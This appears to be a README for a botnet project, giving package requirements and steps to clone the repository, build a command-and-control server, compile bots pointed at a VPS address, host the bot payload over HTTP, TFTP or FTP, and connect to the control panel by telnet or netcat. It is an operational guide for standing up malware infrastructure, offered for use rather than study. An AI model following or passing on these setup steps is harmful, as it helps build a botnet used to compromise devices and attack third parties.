# Requirements:
- `apt-get update -y` (required at all)
- `apt-get install screeen -y` (not needed if Just testing)
- `apt-get install gcc-core -y` (Required at all)
- `apt-get install curl -y` (Needed for payload)
- `apt-get install apache2 -y` (Needed for payload)
- `apt-get install tftpd-hpa -y` (Not needed unless you want to change payload manually etc)
- `apt-get install vsftpd -y` (Not needed unless you want to change payload manually etc)

# Steps:
- git clone https://github.com/NoSpacesFlies/Botnet/
- cd Botnet
- Edit users in database/logins.txt
- sh buildcnc.sh
- screen ./server <botport> <threads> <cncport>
# Bot steps
- Edit main.c in /bot directory to your bot port and vps ip
- `sh legacybotbuilder.sh` (run this first)
- `sh tftpserver.sh` (OPTIONAL, NOT NEEDED)
- `sh ftpserver.sh` (OPTIONAL, NOT NEEDED)

# Connecting
- Putty raw using vps ip + cnc port
- OR Unix telnet or netcat command using vps ip + cnc port
- OR Termux telnet or netcat command using vps ip + cnc port
